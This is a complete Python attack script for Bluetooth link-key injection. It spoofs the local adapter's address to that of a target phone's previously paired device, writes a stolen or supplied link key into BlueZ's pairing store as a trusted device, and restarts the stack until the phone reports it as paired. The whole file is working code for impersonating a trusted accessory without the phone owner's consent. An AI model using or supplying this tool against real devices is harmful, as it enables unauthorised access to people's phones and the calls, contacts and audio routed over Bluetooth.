#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import argparse

def reverse_key(key):
    b = bytes.fromhex(key)
    return b[::-1].hex()

def spoof_address(target_addr,hci="hci0"):
    print(f"[*] Spoofing BT address to {target_addr}...")
    subprocess.run(["hciconfig", hci, "up"], check=True)
    time.sleep(1)
    result = subprocess.run(["bdaddr", "-i", hci, target_addr], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] bdaddr failed: {result.stderr}")
        sys.exit(1)
    subprocess.run(["hciconfig", hci, "down"], check=True)
    subprocess.run(["hciconfig", hci, "up"], check=True)
    time.sleep(1)
    result = subprocess.run(["hciconfig", hci], capture_output=True, text=True)
    if target_addr.upper() in result.stdout.upper():
        print(f"[+] Address spoofed to {target_addr}")
    else:
        print(f"[!] Spoofing may have failed, check hciconfig")

def write_info(radio_addr, phone_addr, key, device_name):
    path = f"/var/lib/bluetooth/{radio_addr}/{phone_addr}"
    os.makedirs(path, exist_ok=True)

    info = f"""[General]
Name={device_name}
SupportedTechnologies=BR/EDR;
Trusted=true
Blocked=false

[LinkKey]
Key={key}
Type=5
PINLength=0
"""
    with open(f"{path}/info", "w") as f:
        f.write(info)
    print(f"[+] Written to {path}/info")

def restart_and_check(phone_addr):
    print("[*] Restarting bluetooth...")
    subprocess.run(["systemctl", "restart", "bluetooth"], check=True)
    time.sleep(3)

    result = subprocess.run(
        ["bluetoothctl", "info", phone_addr],
        capture_output=True, text=True
    )

    if "Paired: yes" in result.stdout:
        print("[+] Pairing confirmed!")
        return True

    print("[-] Not paired yet, trying once more...")
    subprocess.run(["systemctl", "restart", "bluetooth"], check=True)
    time.sleep(3)

    result = subprocess.run(
        ["bluetoothctl", "info", phone_addr],
        capture_output=True, text=True
    )
    if "Paired: yes" in result.stdout:
        print("[+] Pairing confirmed on second attempt!")
        return True

    print("[!] Still not paired. Check key/addresses.")
    print(result.stdout)
    return False

def main():
    parser = argparse.ArgumentParser(description="Inject Bluetooth link key for passwordless pairing")
    parser.add_argument("--radio", required=True, help="BT address to spoof (original radio's address)")
    parser.add_argument("--phone", required=True, help="BT address of the phone")
    parser.add_argument("--key",   required=True, help="Link key (32 hex chars)")
    parser.add_argument("--name",  default="Unknown", help="Device name")
    parser.add_argument("--reverse", action="store_true", help="Reverse byte order of key")
    parser.add_argument("--hci",  default="hci0",help="HCI index, default: hci0")
    args = parser.parse_args()

    radio_addr = args.radio.upper()
    phone_addr = args.phone.upper()
    key = args.key.lower()
    hci = args.hci.lower()

    if args.reverse:
        key = reverse_key(key)
        print(f"[*] Reversed key: {key}")

    if len(key) != 32:
        print("[!] Key must be 32 hex chars (16 bytes)")
        sys.exit(1)

    spoof_address(radio_addr,hci)
    write_info(radio_addr, phone_addr, key, args.name)
    restart_and_check(phone_addr)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Run as root")
        sys.exit(1)
    main()
